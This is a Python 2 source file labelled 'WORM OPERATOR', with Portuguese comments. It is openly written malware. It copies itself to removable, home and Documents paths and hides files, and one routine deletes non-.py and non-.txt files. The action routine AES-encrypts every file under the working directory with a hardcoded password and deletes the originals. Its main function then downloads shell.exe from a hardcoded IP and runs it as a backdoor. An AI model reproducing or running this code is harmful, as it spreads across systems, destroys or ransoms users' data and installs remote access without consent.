#========WORM OPERATOR==========
from shutil import copyfile
import os, getpass
from sys import argv
import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil
import subprocess

# Função para rodar um comando no terminal
def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return process.returncode, stdout, stderr

# Função para propagar o worm
def propagate():
    # Copiando o worm para o diretório de inicialização do sistema operacional
    source = os.path.abspath("worm.py")
    # Verificando o sistema operacional
    user = getpass.getuser()

    # Verificando a unidade de disco
    if (os.path.isdir("E:\\")):
        destination = "E:"+ "\\worm.py"
    
    # Verificando pasta de documentos do Linux
    elif (os.path.isdir("/home/" + user + "/Documents")):
        destination = "/home/" + user + "/Documents/"+"worm.py"

    # Verificando pasta de downloads do Linux
    elif (os.path.isdir("/home/" + user + "/Downloads")):
        destination = "/home/" + user + "/Downloads/"+"worm.py"

    # Verificando pasta de documentos do Windows
    elif(os.path.isdir("C:\\")):
        destination = "C:\\Users\\"+user+"\\worm.py"

    else:
        # Se não for possível encontrar um local para copiar o worm, será salvo na pasta atual
        destination = os.getcwd() + "\\worm.py"

    copyfile(source, destination)
    run_command("attrib +h " + destination)
    print("O worm será propagado para:")
    print("Origem: " + source)
    print("Destino: " + destination)

#função para copiar o worm
def copy():
    # Copiando o worm para o diretório de inicialização do sistema operacional
    script = argv
    name = str(script[0])
    brutal = os.path.abspath(name)

    for i in range(0, 4):
        try:
            # Criando um diretório para copiar o worm
            directoryName = "copy"+str(i)
            os.mkdir(directoryName)
            shutil.copy2(brutal, directoryName)
            source = os.path.abspath(directoryName)
        except:
            pass

#função para ocultar o worm
def hide():
    for file_name in os.listdir('.'):
        if file_name.find('.py') == len(file_name) - len('.py'):
            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_HIDDEN)
        elif file_name.find('.txt') == len(file_name) - len('.txt'):
            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_HIDDEN)
        else:
            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_NORMAL)
            os.remove(file_name)


#função para criptografar o worm
def encrypt(key, filename):
    # Tamanho do chunk
    chunksize = 64*1024

    # Nome do arquivo de saída
    outFile = os.path.join(os.path.dirname(filename),"(encrypted)" + os.path.basename(filename))

    # Tamanho do arquivo
    filesize = str(os.path.getsize(filename)).zfill(16)

    # Inicializando o vetor de inicialização
    IV = ''

    # Gerando um vetor de inicialização aleatório

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))
    
    # Criando um objeto de criptografia
    encryptor = AES.new(key, AES.MODE_CBC, IV)

    # Escrevendo o tamanho do arquivo criptografado
    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                
                outfile.write(encryptor.encrypt(chunk))

def decrypt(key, filename):
    # Tamanho do chunk
    outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))

    # Tamanho do chunk
    chunksize = 64 * 1024
    with open(filename, "rb") as infile:
            filesize = infile.read(16)
            IV = infile.read(16)

            decryptor = AES.new(key, AES.MODE_CBC, IV)
            
            with open(outFile, "wb") as outfile:
                    while True:
                            chunk = infile.read(chunksize)
                            if len(chunk) == 0:
                                    break

                            outfile.write(decryptor.decrypt(chunk))

                    outfile.truncate(int(filesize))
       
def allfiles():
        allFiles = []
        for root, subfiles, files in os.walk(os.getcwd()):
                for names in files:
                        allFiles.append(os.path.join(root, names))
 
        return allFiles
 
def action():
        password = "QEWJR3OIR2YUD92128!$##%$^*(093URO3DMKMXS,NCFJVHBHDUWQDHUDHQ9jswdhgehydxbhwqdbwyhfc"
        encFiles = allfiles()
        for Tfiles in encFiles:
                if os.path.basename(Tfiles).startswith("(encrypted)"):
                        print("%s is already encrypted") %str(Tfiles)
                        pass
 
                elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                        pass
                else:
                        encrypt(SHA256.new(password).digest(), str(Tfiles))
                        print("Done encrypting %s" %str(Tfiles))
                        os.remove(Tfiles)


def downloadBackdoor(url):
	# get filename from url
                filename = url.split('/')[-1].split('#')[0].split('?')[0]
                content = urlopen(url).read()
                outfile = open(filename, "wb")
                outfile.write(content)
                outfile.close()
                run(os.path.abspath(filename))
                print ("finish downloading")
        

def run(prog):
        process = sp.Popen(prog, shell=True)
        process.wait()


def main():
        copy()
        #hide()
        #propagate()
        action()
        downloadBackdoor("http://172.16.190.175/security/dist/shell.exe")
        
        

if __name__=="__main__":
        main()  